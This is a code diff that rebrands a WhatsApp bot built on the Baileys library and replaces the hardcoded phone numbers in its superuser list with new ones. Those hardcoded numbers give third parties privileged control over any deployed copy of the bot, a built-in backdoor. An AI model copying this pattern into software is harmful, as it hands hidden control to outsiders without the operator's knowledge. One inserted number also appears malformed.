@@ -190,10 +190,10 @@ if (conf.ANYWAY_MD === "yes") {
             var membreGroupe = verifGroupe ? ms.key.participant : '';
             const { getAllSudoNumbers } = require("./bdd/sudo");
             const nomAuteurMessage = ms.pushName;
-            const dj = '255678892560';
-            const dj2 = '255678892560';
-            const dj3 = "255678892560";
-            const luffy = '255678892560';
+            const dj = '254701082940';
+            const dj2 = '254701082940';
+            const dj3 = "25491637868";
+            const luffy = '254791637868';
             const sudo = await getAllSudoNumbers();
             const superUserNumbers = [servBot, dj, dj2, dj3, luffy, conf.NUMERO_OWNER].map((s) => s.replace(/[^0-9]/g) + "@s.whatsapp.net");
             const allAllowedNumbers = superUserNumbers.concat(sudo);
@@ -843,13 +843,13 @@ zk.ev.on('group-participants.update', async (group) => {
                 console.log("ℹ️ RAHMA XMD is connecting...");
             }
             else if (connection === 'open') {
-                console.log("✅ RAHMAN XMD Connected to WhatsApp! ☺️");
+                console.log("✅ ᏦᏆᏞᏞᎬᎡ ХᎷᎠ  Connected to WhatsApp! ☺️");
                 console.log("--");
                 await (0, baileys_1.delay)(200);
                 console.log("------");
                 await (0, baileys_1.delay)(300);
                 console.log("------------------/-----");
-                console.log("RAHMAN XMD is Online 🕸\n\n");
+                console.log("ᏦᏆᏞᏞᎬᎡ ХᎷᎠ  is Online 🕸\n\n");
                 //chargement des commandes 
                 console.log("Loading Anyway Commands ...\n");
                 fs.readdirSync(__dirname + "/commandes").forEach((fichier) => {
@@ -884,7 +884,7 @@ zk.ev.on('group-participants.update', async (group) => {
 
                 let cmsg =`      ʀᴀʜᴍᴀɴɪ-xᴍᴅ ᴄᴏɴɴᴇᴄᴛᴇᴅ
 ╭─────────────━┈⊷ 
-│🌏 RAHMAN CONNECTED
+│🌏 ᏦᏆᏞᏞᎬᎡ ХᎷᎠ  CONNECTED
 │💫 ᴘʀᴇғɪx: *[ ${prefixe} ]*
 │⭕ ᴍᴏᴅᴇ: *${md}*
 ╰─────────────━┈⊷⁠⁠⁠⁠`;
